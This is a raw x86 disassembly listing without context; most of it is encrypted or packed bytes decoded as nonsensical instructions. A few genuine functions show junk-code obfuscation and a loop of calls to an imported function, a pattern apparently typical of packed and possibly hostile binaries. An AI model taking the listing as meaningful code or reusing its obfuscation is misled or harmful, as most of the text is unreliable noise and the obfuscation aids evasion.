  40820d:	sbb    dh,BYTE PTR [esi-0x5b]
  408210:	dec    ebp
  408211:	inc    esi
  408212:	ficom  DWORD PTR [ebx+0x6b]
  408215:	call   0x9180:0x49b670ad
  40821c:	test   eax,0x8ce7a591
  408221:	ror    DWORD PTR [edi],1
  408223:	xor    BYTE PTR [ebx-0x2a],dl
  408226:	cmp    eax,0xf9681b58
  40822b:	sbb    eax,0xc68e61bd
  408230:	lds    ecx,FWORD PTR [ecx+0xaa78af6]
  408236:	xor    eax,0xf748a885
  40823b:	pop    ebx
  40823c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40823d:	fld    QWORD PTR [edi]
  40823f:	dec    esi
  408240:	push   ecx
  408241:	adc    BYTE PTR [esi],dl
  408243:	or     BYTE PTR [ebx+edi*1],bl
  408246:	test   al,0x49
  408248:	cli    
  408249:	push   es
  40824a:	jg     0x408229
  40824c:	and    edi,edi
  40824e:	fcom   QWORD PTR [esi-0x4c]
  408251:	iret   
  408252:	loope  0x4082c7
  408254:	(bad)  
  408255:	mov    edx,0x96c113c3
  40825a:	iret   
  40825b:	cdq    
  40825c:	sbb    cl,ch
  40825e:	aaa    
  40825f:	rdtsc  
  408261:	popf   
  408262:	jae    0x40824c
  408264:	cwde   
  408265:	aam    0x5
  408267:	retf   
  408268:	out    0x51,al
  40826a:	jns    0x4082a0
  40826c:	pop    ecx
  40826d:	xlat   BYTE PTR ds:[ebx]
  40826e:	push   eax
  40826f:	sub    BYTE PTR [esi+esi*4],dl
  408272:	sbb    al,0x33
  408274:	bound  ecx,QWORD PTR [edx-0x4d]
  408277:	xor    ecx,DWORD PTR [ebx-0x3d]
  40827a:	retf   
  40827b:	inc    edx
  40827c:	pop    edi
  40827d:	in     eax,0xeb
  40827f:	adc    DWORD PTR [esi+0x5c],0x78c9c05a
  408286:	fcomp  DWORD PTR [ebp-0xcbecc31]
  40828c:	mov    dh,0xa7
  40828e:	out    0xf3,al
  408290:	push   esi
  408291:	imul   esi,DWORD PTR [ecx-0x302909b9],0xffffff85
  408298:	scas   al,BYTE PTR es:[edi]
  408299:	(bad)  
  40829a:	nop
  40829b:	xchg   BYTE PTR [edi+0x10cb73b3],bl
  4082a1:	xor    ecx,0xffffffa6
  4082a4:	mov    ebx,0x598b5f7c
  4082a9:	icebp  
  4082aa:	inc    ebx
  4082ab:	sbb    eax,0xb8d5abdf
  4082b0:	push   es
  4082b1:	mov    eax,0x5c826802
  4082b6:	test   DWORD PTR [ebp+0x4bdb16fd],esi
  4082bc:	lahf   
  4082bd:	mov    BYTE PTR fs:[esi+esi*1+0x34f9afa4],0xc
  4082c6:	nop
  4082c7:	cmp    dl,ch
  4082c9:	dec    esi
  4082ca:	enter  0x68a8,0x5b
  4082ce:	add    ah,dh
  4082d0:	mov    ebx,0x58ce3d1e
  4082d5:	jmp    0xcec7:0x20608fc0
  4082dc:	cmp    eax,0xade53459
  4082e1:	ss dec esi
  4082e3:	add    eax,0xd474d3dd
  4082e8:	mov    dl,0xb5
  4082ea:	mov    ds:0xe35ea7e3,al
  4082ef:	ins    DWORD PTR es:[edi],dx
  4082f0:	(bad)  
  4082f2:	push   edx
  4082f3:	mov    ah,0x23
  4082f5:	push   ecx
  4082f6:	or     ecx,ecx
  4082f8:	out    0xe2,al
  4082fa:	jnp    0x408348
  4082fc:	mov    eax,edi
  4082fe:	cmp    al,0x42
  408300:	sub    eax,0x220186eb
  408305:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408306:	adc    al,0x21
  408308:	ja     0x4082c3
  40830a:	je     0x4082ca
  40830c:	and    edx,ebx
  40830e:	(bad)  
  40830f:	outs   dx,BYTE PTR ds:[esi]
  408310:	lea    ebp,[ebx-0x39]
  408313:	xor    BYTE PTR [ecx+0x5aafdce7],ch
  408319:	test   al,0x61
  40831b:	outs   dx,BYTE PTR ds:[esi]
  40831c:	mov    ch,BYTE PTR [edx+0x282d5be1]
  408322:	xchg   BYTE PTR [edx-0x40],ah
  408325:	and    al,0xe8
  408327:	rcr    BYTE PTR [ebx-0x72222dfb],cl
  40832d:	test   BYTE PTR [eax],dl
  40832f:	popf   
  408330:	jb     0x408364
  408332:	add    BYTE PTR [ecx+0x45ff0845],cl
  408338:	or     al,0xe9
  40833a:	adc    al,0xfb
  40833c:	(bad)  
  40833d:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  408343:	mov    ecx,DWORD PTR [ebp+0x10]
  408346:	add    eax,esi
  408348:	mov    DWORD PTR [ecx],eax
  40834a:	pop    esi
  40834b:	leave  
  40834c:	ret    0xc
  40834f:	push   ebp
  408350:	mov    ebp,esp
  408352:	push   ecx
  408353:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40835a:	neg    eax
  40835c:	mov    eax,DWORD PTR [ebp-0x4]
  40835f:	movzx  ecx,WORD PTR ds:0x42e872
  408366:	adc    DWORD PTR ds:0x42e862,ecx
  40836c:	mov    edx,DWORD PTR [ebp+0x10]
  40836f:	mov    ecx,0x7510856
  408374:	sub    DWORD PTR ds:0x430642,0x4d69
  40837e:	xor    eax,ecx
  408380:	add    eax,0x32729d
  408385:	adc    DWORD PTR ds:0x42e86e,0x62f9
  40838f:	mov    DWORD PTR [edx],eax
  408391:	mov    eax,DWORD PTR [ebp+0xc]
  408394:	adc    edx,DWORD PTR ds:0x42e86e
  40839a:	xor    eax,ecx
  40839c:	or     DWORD PTR ds:0x4305a6,ecx
  4083a2:	push   esi
  4083a3:	movzx  esi,BYTE PTR ds:0x43058a
  4083aa:	or     DWORD PTR ds:0x42ef0c,esi
  4083b0:	mov    esi,DWORD PTR [ebp+0x10]
  4083b3:	adc    DWORD PTR ds:0x42ef10,0x7d94
  4083bd:	mov    edx,0x32729d
  4083c2:	add    eax,edx
  4083c4:	mov    DWORD PTR [esi+0x4],eax
  4083c7:	xor    eax,eax
  4083c9:	mov    eax,DWORD PTR [ebp+0x14]
  4083cc:	mov    esi,DWORD PTR [ebp+0x10]
  4083cf:	mov    DWORD PTR [esi+0x8],eax
  4083d2:	or     DWORD PTR ds:0x43058e,ebx
  4083d8:	mov    eax,DWORD PTR [ebp+0x18]
  4083db:	dec    esi
  4083dc:	mov    esi,DWORD PTR [ebp+0x10]
  4083df:	sbb    DWORD PTR ds:0x42e866,0xab4
  4083e9:	mov    DWORD PTR [esi+0xc],eax
  4083ec:	mov    eax,DWORD PTR [ebp+0x1c]
  4083ef:	adc    DWORD PTR ds:0x43059a,ebx
  4083f5:	mov    esi,DWORD PTR [ebp+0x10]
  4083f8:	or     DWORD PTR ds:0x42e876,0x42e86e
  408402:	mov    DWORD PTR [esi+0x10],eax
  408405:	adc    DWORD PTR ds:0x42e86e,edi
  40840b:	mov    eax,eax
  40840d:	and    DWORD PTR ds:0x43058e,0x0
  408417:	mov    esi,DWORD PTR ds:0x43058e
  40841d:	inc    esi
  40841e:	mov    DWORD PTR ds:0x43058e,esi
  408424:	cmp    DWORD PTR ds:0x43058e,0x17
  40842b:	jne    0x40844d
  408431:	push   DWORD PTR [ebp-0x24]
  408434:	push   0x2fa6
  408439:	push   DWORD PTR [ebp-0x28]
  40843c:	push   DWORD PTR [ebp-0x10]
  40843f:	push   DWORD PTR [ebp-0x14]
  408442:	push   0x162f
  408447:	call   DWORD PTR ds:0x42eb08
  40844d:	cmp    DWORD PTR ds:0x43058e,0x15
  408454:	jb     0x408417
  40845a:	mov    eax,DWORD PTR [ebp+0x8]
  40845d:	xor    eax,ecx
  40845f:	add    eax,edx
  408461:	pop    esi
  408462:	leave  
  408463:	ret    0x18
  408466:	push   ebp
  408467:	mov    ebp,esp
  408469:	mov    eax,DWORD PTR [ebp+0xc]
  40846c:	jmp    0x40876b
  408471:	cs leave 
  408473:	or     DWORD PTR [edi+0x69204779],0xc097db4f
  40847d:	sbb    ebp,DWORD PTR [ebp-0x239e9d3a]
  408483:	jle    0x408503
  408485:	push   eax
  408486:	jo     0x408506
  408488:	jle    0x40848c
  40848a:	and    DWORD PTR ss:[ebx],esp
  40848d:	adc    BYTE PTR [ebx],dl
  40848f:	and    eax,0xa6e0e2a7
  408494:	push   0x2f
  408496:	xchg   ebp,eax
  408497:	repnz xchg ebp,eax
  408499:	lea    ebp,[esi]
  40849b:	addr16 sub ebx,0x16116718
  4084a2:	jg     0x4084f0
  4084a4:	xor    BYTE PTR [esi-0x3c],0x57
  4084a8:	neg    DWORD PTR [esi]
  4084aa:	jnp    0x4084d0
  4084ac:	rol    DWORD PTR [ebx+0x68fbc7db],1
  4084b2:	mov    esi,0x6c43c958
  4084b7:	xor    DWORD PTR [edx-0x7c],0xffffffe8
  4084bb:	(bad)  
  4084bc:	stos   BYTE PTR es:[edi],al
  4084bd:	aaa    
  4084be:	dec    ebx
  4084bf:	jno    0x4084ff
  4084c1:	or     al,0xed
  4084c3:	and    DWORD PTR [esp+eiz*2-0x2485328f],0xffffffbd
  4084cb:	rol    BYTE PTR [edx-0x2e69fdfb],1
  4084d1:	add    al,0x6d
  4084d3:	sub    al,0x40
  4084d5:	loope  0x408538
  4084d7:	mov    ecx,0x76b2791a
  4084dc:	mul    DWORD PTR [ebp+0x430d991e]
  4084e2:	(bad)  
  4084e3:	or     esp,eax
  4084e5:	out    dx,al
  4084e6:	jp     0x408553
  4084e8:	xchg   esi,eax
  4084e9:	(bad)  
  4084ea:	fs mov dl,0x1d
  4084ed:	adc    BYTE PTR [ecx+0x21],bl
  4084f0:	mov    ebp,0x818b37e4
  4084f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f6:	xchg   esi,eax
  4084f7:	xchg   ebx,eax
  4084f8:	sub    al,0xb3
  4084fa:	out    0xf2,eax
  4084fc:	dec    esp
  4084fd:	xor    ebp,DWORD PTR [edi+esi*2-0x2a]
  408501:	pushf  
  408502:	mov    ebx,0xbe251dc1
  408507:	xor    ch,bh
  408509:	cmp    BYTE PTR [edi+0x35],ch
  40850c:	xor    al,0x46
  40850e:	mov    dl,0x4c
  408510:	int3   
  408511:	and    DWORD PTR [ecx],eax
  408513:	xor    cl,al
  408515:	adc    al,0x5d
  408517:	or     DWORD PTR [esi-0x4],ecx
  40851a:	fs (bad) 
  40851d:	inc    eax
  40851e:	iret   
  40851f:	mov    bh,0xcd
  408521:	pop    ecx
  408522:	mov    ch,0x23
  408524:	cmp    al,0xee
  408526:	pop    es
  408527:	(bad)  
  408528:	mov    edx,0x76c50b24
  40852d:	(bad)
  408530:	mov    cl,0x2b
  408532:	div    DWORD PTR [edx-0x74]
  408535:	cmp    eax,0x1040260e
  40853a:	and    esi,DWORD PTR [ecx-0x601198ba]
  408540:	psraw  mm3,QWORD PTR [edi]
  408543:	mov    edi,0xc82f4e4c
  408548:	inc    ebp
  408549:	jg     0x408540
  40854b:	jbe    0x4085a5
  40854d:	(bad)  
  40854e:	pop    edi
  40854f:	iret   
  408550:	sahf   
  408551:	sub    bh,al
  408553:	call   0x41d9:0x55e8f543
  40855a:	outs   dx,DWORD PTR ds:[esi]
  40855b:	jb     0x40859f
  40855d:	dec    ecx
  40855e:	sbb    esi,esi
  408560:	gs dec edx
  408562:	or     eax,0xe7f4518d
  408567:	out    dx,al
  408568:	outs   dx,BYTE PTR ds:[esi]
  408569:	mov    cs,WORD PTR [edx+0x65]
  40856c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40856d:	cdq    
  40856e:	cmp    DWORD PTR [ebp+0x6024b5cd],eax
  408574:	into   
  408575:	shld   DWORD PTR [ecx+edx*8],edi,cl
  408579:	repnz aam 0x8b
  40857c:	or     al,0x78
  40857e:	mov    esp,0xfd7626a
  408583:	mov    ch,0xe1
  408585:	jns    0x408532
  408587:	loopne 0x408576
  408589:	mov    esi,0xb9b2e3c0
  40858e:	adc    DWORD PTR [edi-0x63fb92b6],ebp
  408594:	push   0xc916cc67
  408599:	inc    edx
  40859a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40859b:	sbb    BYTE PTR [ecx-0x40d36c19],dl
  4085a1:	xchg   ebp,eax
  4085a2:	sbb    al,0x0
  4085a4:	inc    esi
  4085a5:	xchg   ebp,eax
  4085a6:	stos   BYTE PTR es:[edi],al
  4085a7:	add    dh,BYTE PTR [ebx]
  4085a9:	mov    ds:0x6b409f6c,al
  4085ae:	xor    DWORD PTR [edi+ebp*4+0x10],0xb
  4085b3:	hlt    
  4085b4:	sub    DWORD PTR [edi+0x30511290],edx
  4085ba:	outs   dx,DWORD PTR ds:[esi]
  4085bb:	mov    ds:0xeded1758,al
  4085c0:	sahf   
  4085c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085c2:	aas    
  4085c3:	or     ch,dl
  4085c5:	pminsw mm6,QWORD PTR [ebx]
  4085c8:	lods   al,BYTE PTR ds:[esi]
  4085c9:	mov    DWORD PTR [esi],esp
  4085cb:	xchg   ecx,eax
  4085cc:	dec    ecx
  4085cd:	std    
  4085ce:	pop    ebx
  4085cf:	cmc    
  4085d0:	pushf  
  4085d1:	jge    0x4085d3
  4085d3:	mov    dl,0x1a
  4085d5:	xor    eax,0x5f8e3385
  4085da:	shl    ch,1
  4085dc:	inc    ebx
  4085dd:	xchg   ebx,eax
  4085de:	pop    ss
  4085df:	mov    ebx,0xcb1006eb
  4085e4:	fimul  DWORD PTR [ebp+0x2e]
  4085e7:	test   al,ch
  4085e9:	xchg   edx,eax
  4085ea:	out    dx,eax
  4085eb:	push   ebp
  4085ec:	int3   
  4085ed:	mov    ah,BYTE PTR [ebp-0x3b25f72c]
  4085f3:	shr    DWORD PTR [eax],1
  4085f5:	ins    DWORD PTR es:[edi],dx
  4085f6:	sub    edx,ecx
  4085f8:	mov    ebp,0x93146a3
  4085fd:	fimul  DWORD PTR [edi-0x624c208]
  408603:	aas    
  408604:	push   0x9
  408606:	mov    ds:0x58790687,al
  40860b:	loopne 0x40861f
  40860d:	pop    eax
  40860e:	cmp    eax,0xf2f466a8
  408613:	in     al,0xf5
  408615:	and    eax,0xba775707
  40861a:	jbe    0x408629
  40861c:	sbb    ebx,DWORD PTR [esi-0x1b]
  40861f:	mov    edi,0x753df3df
  408624:	jg     0x4085ca
  408626:	push   esi
  408627:	data16 or al,0x17
  40862a:	sbb    ebp,DWORD PTR [ecx+0x66]
  40862d:	mov    edx,0xa1b9f6fd
  408632:	or     ah,BYTE PTR ds:0xe1146fa1
  408638:	aad    0x29
  40863a:	pop    esi
  40863b:	sub    eax,0x4f46bc11
  408640:	add    ch,BYTE PTR [esi+ecx*8]
  408643:	(bad)  
  408644:	sub    ecx,DWORD PTR [eax+0x5016c5a4]
  40864a:	mov    edx,0x5db2a19f
  40864f:	call   0xa6d79584
  408654:	in     al,dx
  408655:	lds    eax,FWORD PTR [ebp-0x78]
  408658:	dec    esi
  408659:	inc    esi
  40865a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40865b:	jae    0x40864d
  40865d:	adc    al,al
  40865f:	mov    al,ds:0x54284836
  408664:	popa   
  408665:	sbb    ah,0xf8
  408668:	dec    edx
  408669:	jo     0x4086b5
  40866b:	and    al,0xc3
  40866d:	sti    
  40866e:	fstp   TBYTE PTR [esi-0x57]
  408671:	jb     0x4086cd
  408673:	ss or  eax,0x60054315
  408679:	ffree  st(4)
  40867b:	cmp    al,0x2d
  40867d:	or     eax,0x5da912f6
  408682:	sub    al,0x61
  408684:	arpl   WORD PTR [esp+ecx*2],si
  408687:	inc    esp
  408688:	mov    eax,0x42139004
  40868d:	sub    al,0xd1
  40868f:	call   0x9b5f26e
  408694:	mov    bh,0x4d
  408696:	xchg   ebp,eax
  408697:	shl    esp,1
  408699:	jne    0x4086a2
  40869b:	push   ss
  40869c:	jae    0x408661
  40869e:	pusha  
  40869f:	push   eax
  4086a0:	(bad)  
  4086a1:	pop    ss
  4086a2:	int3   
  4086a3:	xor    DWORD PTR [esi+0x7fa1abea],edi
  4086a9:	sbb    al,0x79
  4086ab:	jmp    0xe90922d9
  4086b0:	neg    DWORD PTR [ecx+0x406ff1ce]
  4086b6:	call   DWORD PTR [ebp+0xf81dece]
  4086bc:	loop   0x4086cd
  4086be:	pop    ss
  4086bf:	das    
  4086c0:	pop    edx
  4086c1:	or     eax,eax
  4086c3:	jecxz  0x408647
  4086c5:	jnp    0x40865d
  4086c7:	xchg   edx,eax
  4086c8:	jbe    0x40870e
  4086ca:	or     eax,DWORD PTR [ecx]
  4086cc:	outs   dx,BYTE PTR ds:[esi]
  4086cd:	shr    DWORD PTR [ebx+0x2a],cl
  4086d0:	add    al,dh
  4086d2:	cmc    
  4086d3:	imul   eax,DWORD PTR [eax],0xffffffc7
  4086d6:	lea    ecx,[edx]
  4086d8:	mov    eax,ds:0x1e37c7f9
  4086dd:	jnp    0x4086e1
  4086df:	jl     0x4086bd
  4086e1:	mov    cl,0x3
  4086e3:	inc    esi
  4086e4:	sbb    al,0xdb
  4086e6:	mov    dh,0x5c
  4086e8:	fwait
  4086e9:	loopne 0x40869c
  4086eb:	pop    ecx
  4086ec:	push   0xffffffd9
  4086ee:	jle    0x408717
  4086f0:	jns    0x40873f
  4086f2:	cmp    bl,dl
  4086f4:	inc    eax
  4086f5:	push   ebp
  4086f7:	xor    BYTE PTR [ebx-0x2],al
  4086fa:	gs (bad) 
  4086fc:	push   cs
  4086fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086fe:	add    ebx,DWORD PTR [edx+0x16]
  408701:	xchg   ebp,eax
  408702:	mov    bl,0x72
  408704:	stos   DWORD PTR es:[edi],eax
  408705:	test   eax,0x76951dd2
  40870a:	mov    ah,0x5a
  40870c:	sbb    esp,edx
  40870e:	jo     0x408750
  408710:	mov    bh,0x32
  408712:	xchg   edi,eax
  408713:	jmp    0xa56d2013
  408718:	jecxz  0x40872c
  40871a:	mov    esp,0x3826e4b5
  40871f:	mov    eax,ds:0xa38886c3
  408724:	sbb    BYTE PTR [ebx+0x22baafa4],bh
  40872a:	jo     0x4086e2
  40872c:	mov    es,WORD PTR ds:0x734a6aaf
  408732:	push   edi
  408733:	(bad)  
  408735:	sbb    esp,edi
  408737:	mov    ah,0x82
  408739:	mov    ah,0xb2
  40873b:	imul   ebp,DWORD PTR [eax],0xffffffed
  40873e:	mov    cl,0x8c
  408740:	jno    0x408752
  408742:	ins    BYTE PTR es:[edi],dx
  408743:	fbld   TBYTE PTR [edx+0x288f0b7]
  408749:	add    esi,esp
  40874b:	rcl    DWORD PTR [eax],0xaf
  40874e:	nop
  40874f:	push   0x2768163
  408754:	es lock adc bl,0x12
  408759:	cs fwait
  40875b:	out    0x5a,eax
  40875d:	out    dx,al
  40875e:	ror    BYTE PTR [ebp-0x79],1
  408761:	inc    eax
  408762:	and    ecx,DWORD PTR [edx+0x3293995c]
  408768:	test   al,0xb9
  40876a:	mov    bh,0x33
  40876c:	sar    BYTE PTR [ecx+0x7264fcad],cl
  408772:	div    ecx
  408774:	mov    ecx,DWORD PTR [ebp+0x10]
  408777:	and    ecx,eax
  408779:	jmp    0x408a78
  40877e:	out    0xd4,eax
  408780:	xchg   BYTE PTR [ebx+0x6cfb7d9d],al
  408786:	imul   edx,ecx,0xfffffff2
  408789:	(bad)  
  40878a:	fisub  DWORD PTR [edi+0x47]
  40878d:	in     eax,0x43
  40878f:	fistp  QWORD PTR [esi+0x7e]
  408792:	push   eax
  408793:	jo     0x408813
  408795:	jle    0x408750
  408797:	in     al,dx
  408798:	popf   
  408799:	(bad)  
  40879b:	sub    DWORD PTR [eax+0x6f4a7e4],ebx
  4087a1:	call   0xf0c7420f
  4087a6:	pop    esi
  4087a7:	ins    BYTE PTR es:[edi],dx
  4087a8:	pushf  
  4087a9:	or     bh,al
  4087ab:	lds    esp,FWORD PTR [eax]
  4087ad:	fnstenv [ebx]
  4087af:	xchg   esi,eax
  4087b0:	mov    al,0xd6
  4087b2:	mov    eax,ds:0x10b0f3d8
  4087b7:	repnz push 0xffffff9e
  4087ba:	test   DWORD PTR [ecx+ecx*4],ebp
  4087bd:	push   0x154427e8
  4087c2:	mov    al,0x3e
  4087c4:	cmp    eax,DWORD PTR [ebp-0x4fdeb4cd]
  4087ca:	dec    ecx
  4087cb:	xor    al,0xae
  4087cd:	call   0xa6c:0x5af70752
  4087d4:	push   ebp
  4087d5:	push   cs
  4087d6:	mov    bl,0x65
  4087d8:	mov    dh,0xe5
  4087da:	sub    BYTE PTR [edx],0x73
  4087dd:	inc    edi
  4087de:	adc    BYTE PTR [ebx-0x15eadc7f],bh
  4087e4:	scas   eax,DWORD PTR es:[edi]
  4087e5:	pop    eax
  4087e6:	jg     0x408789
  4087e8:	add    dh,BYTE PTR [edi-0x3478cb33]
  4087ee:	test   al,0x63
  4087f0:	lods   al,BYTE PTR ds:[esi]
  4087f1:	sub    ch,BYTE PTR [ebx]
  4087f3:	and    esp,DWORD PTR ds:0x39f9a252
  4087f9:	add    al,BYTE PTR [eax+eax*4+0x4]
  4087fd:	fst    DWORD PTR [eax-0x38]
  408800:	mov    al,0x1a
  408802:	sbb    BYTE PTR [eax],dh
  408804:	lahf   
  408805:	sub    BYTE PTR [ebx+edi*1-0x3c],bl
  408809:	jle    0x4087ba
  40880b:	cld    
  40880c:	xor    al,al
  40880e:	mul    bl
  408810:	aad    0x60
  408812:	sbb    al,0xf8
  408814:	mov    ds:0x55bcd70f,al
  408819:	xchg   ecx,eax
  40881a:	loop   0x408870
  40881c:	push   ss
  40881d:	pop    ss
  40881e:	mov    al,0x8
  408820:	push   esp
  408821:	xchg   ecx,eax
  408822:	jnp    0x4087f7
  408824:	dec    ebx
  408825:	ret    
  408826:	lds    edi,FWORD PTR [edi]
  408828:	aaa    
  408829:	pop    edx
  40882a:	jo     0x408869
  40882c:	pop    ecx
  40882d:	and    dl,BYTE PTR [ecx+0x5e]
  408830:	sub    bl,BYTE PTR ds:0xc332bbe4
  408836:	jb     0x4087ce
  408838:	dec    esp
  408839:	jnp    0x408886
  40883b:	dec    ebx
  40883c:	push   0xffffffee
  40883e:	mov    al,0x3d
  408840:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408841:	imul   ebx,DWORD PTR [edi+0x5b],0xf5e88f1f
  408848:	sub    DWORD PTR [eax+ebp*1],ebp
  40884b:	out    dx,eax
  40884c:	daa    
  40884d:	aas    
  40884e:	popa   
  40884f:	push   eax
  408850:	cs mov edi,?
  408853:	(bad)  
  408854:	int3   
  408855:	add    dh,bl
  408857:	jmp    0x881b32d0
  40885c:	xor    ah,BYTE PTR [eax-0xd21dfb3]
  408862:	popa   
  408863:	adc    ebx,edi
  408865:	jmp    0x4088c7
  408867:	mov    al,0xb4
  408869:	in     eax,dx
  40886a:	nop
  40886b:	push   cs
  40886c:	outs   dx,BYTE PTR ds:[esi]
  40886d:	fadd   QWORD PTR [esi+0x64]
  408870:	imul   bl
  408872:	and    ecx,eax
  408874:	cmp    al,0xab
  408877:	or     eax,0xcf17474f
  40887c:	adc    edx,edx
  40887e:	fistp  DWORD PTR [ebp-0x1abd8792]
  408884:	cli    
  408885:	mov    bl,0x6f
  408887:	or     bl,BYTE PTR [esi-0x14bb8d0a]
  40888d:	pop    esp
  40888e:	int3   
  40888f:	cli    
  408890:	jl     0x4088aa
  408892:	mov    WORD PTR [eax],ds
  408894:	mov    ecx,0x617feedc
  408899:	rcr    BYTE PTR [ecx+0x7bce4349],1
  40889f:	int3   
  4088a0:	mov    eax,0x7c7d7f02
  4088a5:	pop    esi
  4088a6:	and    BYTE PTR [ecx],cl
  4088a8:	fld    TBYTE PTR [ebx-0x3d]
  4088ab:	pop    ds
  4088ac:	sbb    dl,bh
  4088ae:	retf   
  4088af:	clc    
  4088b0:	mov    bh,0x19
  4088b2:	pop    eax
  4088b3:	jb     0x4088cf
  4088b5:	xchg   esi,eax
  4088b6:	aam    0x72
  4088b8:	icebp  
  4088b9:	mov    ds:0xc3508d79,eax
  4088be:	lods   al,BYTE PTR ds:[esi]
  4088bf:	xchg   ebp,eax
  4088c0:	rcl    dl,0xae
  4088c3:	scas   al,BYTE PTR es:[edi]
  4088c4:	sub    bl,ch
  4088c6:	mov    ds:0x86547559,al
  4088cb:	xchg   esi,eax
  4088cc:	or     DWORD PTR [ebx+0x57462385],0x7f
  4088d3:	scas   al,BYTE PTR es:[edi]
  4088d4:	jl     0x40890a
  4088d6:	sbb    eax,0xaaf791ef
  4088db:	push   esp
  4088dc:	call   0x856f688a
  4088e1:	test   al,0x19
  4088e3:	div    BYTE PTR [ebx-0x62e1cb4b]
  4088e9:	adc    DWORD PTR [ecx+0x64],ebx
  4088ec:	jns    0x4088c5
  4088ee:	sub    al,0x51
  4088f0:	sub    esi,DWORD PTR [eax-0x1a]
  4088f3:	push   ss
  4088f4:	xor    BYTE PTR ds:0xff991d8f,cl
  4088fa:	mov    dh,0x81
  4088fc:	bound  edx,QWORD PTR [edx+edx*4-0x6b778842]
  408903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408904:	loopne 0x4088b9
  408906:	push   cs
  408907:	pop    esi
  408908:	push   ss
  408909:	not    BYTE PTR [ecx+0x57905ba5]
  40890f:	jle    0x4088ba
  408911:	push   eax
  408912:	add    cl,BYTE PTR [ebx+0x318f7cde]
  408918:	and    eax,0xb633944f
  40891d:	xor    esp,DWORD PTR [esi-0x1cef1d87]
  408923:	jge    0x4088ff
  408925:	add    al,0x28
  408927:	shr    BYTE PTR [ebx],1
  408929:	or     BYTE PTR [ebp+0x7cc69e82],cl
  40892f:	rcr    DWORD PTR [esi],1
  408931:	mov    cl,0x76
  408933:	loop   0x40892e
  408935:	out    dx,eax
  408936:	mov    eax,DWORD PTR [bx+di]
  408939:	mov    dh,0x8f
  40893b:	inc    esi
  40893c:	add    eax,DWORD PTR [eax+0x7dc57893]
  408942:	lods   al,BYTE PTR ds:[esi]
  408943:	icebp  
  408944:	inc    esp
  408945:	fs xchg ebp,eax
  408947:	adc    DWORD PTR [edx+0x68],0xffffffca
  40894b:	ds xchg ecx,eax
  40894d:	pop    ebp
  40894e:	mov    ds:0xe5476593,al
  408953:	xor    al,0x94
  408955:	or     DWORD PTR [ecx],0xffffffeb
  408958:	in     eax,0x58
  40895a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40895b:	scas   eax,DWORD PTR es:[edi]
  40895c:	aam    0x90
  40895e:	add    al,0x7a
  408960:	xchg   edi,eax
  408961:	popf   
  408962:	xor    eax,0x8749ffc9
  408967:	fwait
  408968:	test   DWORD PTR [esi],0xd58d1c1d
  40896e:	mov    bh,0xc
  408970:	pop    ss
  408971:	mov    dl,0xf1
  408973:	mov    edx,0x32597022
  408978:	inc    eax
  408979:	ret    0x1d16
  40897c:	mov    bl,0x46
  40897f:	fnsave [ecx-0x5e]
  408982:	mov    bl,0xbd
  408984:	bound  esp,QWORD PTR [ebp+0x79433d02]
  40898a:	hlt    
  40898b:	mov    ebp,0x78a4d6c5
  408990:	loopne 0x40896d
  408992:	call   0xb076:0xd50295c6
  408999:	(bad)  
  40899a:	jmp    0x1529:0xe072cf33
  4089a1:	in     al,0x4f
  4089a3:	(bad)  
  4089a4:	jmp    0x5a260f7f
  4089a9:	shl    DWORD PTR [eax-0x7b],0x6
  4089ad:	dec    eax
  4089ae:	ret    0x2e52
  4089b1:	addr16 xchg ebp,eax
  4089b3:	inc    ebp
  4089b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4089b5:	out    dx,al
  4089b6:	and    DWORD PTR [edi-0x3f],0x669854d7
  4089bd:	push   ebp
  4089be:	(bad)  
  4089bf:	pop    esi
  4089c0:	loop   0x4089d8
  4089c2:	pop    esp
  4089c3:	pop    ss
  4089c4:	inc    eax
  4089c5:	ror    BYTE PTR [ebx],cl
  4089c7:	stos   BYTE PTR es:[edi],al
  4089c8:	cld    
  4089c9:	dec    ecx
  4089ca:	test   DWORD PTR [edi+0x51],ebp
  4089cd:	mov    al,ds:0xdb141764
  4089d2:	shr    bl,0x23
  4089d5:	mov    ecx,0x31cac8a3
  4089da:	imul   ebp,DWORD PTR [esi+0x47],0xb2da857d
  4089e1:	mov    ecx,0xd4f2afd2
  4089e6:	clc    
  4089e7:	fldcw  WORD PTR [edx]
  4089e9:	inc    ebx
  4089ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089eb:	mov    ds:0x6f4900ef,al
  4089f0:	(bad)  
  4089f1:	pop    esi
  4089f2:	popf   
  4089f3:	ret    
  4089f4:	sar    BYTE PTR [ecx-0x1e99a611],cl
  4089fa:	lds    ecx,FWORD PTR [eax+edx*8-0x554121e7]
  408a01:	pop    edx
  408a02:	(bad)  
  408a03:	bound  edi,QWORD PTR [esi+0x7e]
  408a06:	aad    0xa6
  408a08:	ret    
  408a09:	push   edx
  408a0a:	lods   eax,DWORD PTR ds:[esi]
  408a0b:	push   cs
  408a0c:	push   ecx
  408a0d:	mov    ch,0x72
  408a0f:	xlat   BYTE PTR ds:[ebx]
  408a10:	xor    al,BYTE PTR [edi-0x102be5e9]
  408a16:	mov    cl,0x29
  408a18:	jnp    0x4089f8
  408a1a:	aam    0xcb
  408a1c:	pop    eax
  408a1d:	sub    al,0x31
  408a1f:	jp     0x408a72
  408a21:	retf   
  408a22:	lea    esi,[ebx]
  408a24:	fwait
  408a25:	sbb    dl,dl
  408a27:	jno    0x408a94
  408a29:	sbb    cl,BYTE PTR [esi+ebx*1+0x41]
  408a2d:	clc    
  408a2e:	dec    edx
  408a2f:	xchg   edx,eax
  408a30:	push   cs
  408a31:	lea    edi,[edi]
  408a33:	pop    ebp
  408a34:	add    cl,BYTE PTR [edx-0x6d1aeb3d]
  408a3a:	cld    
  408a3b:	loopne 0x4089cd
  408a3d:	jl     0x408a21
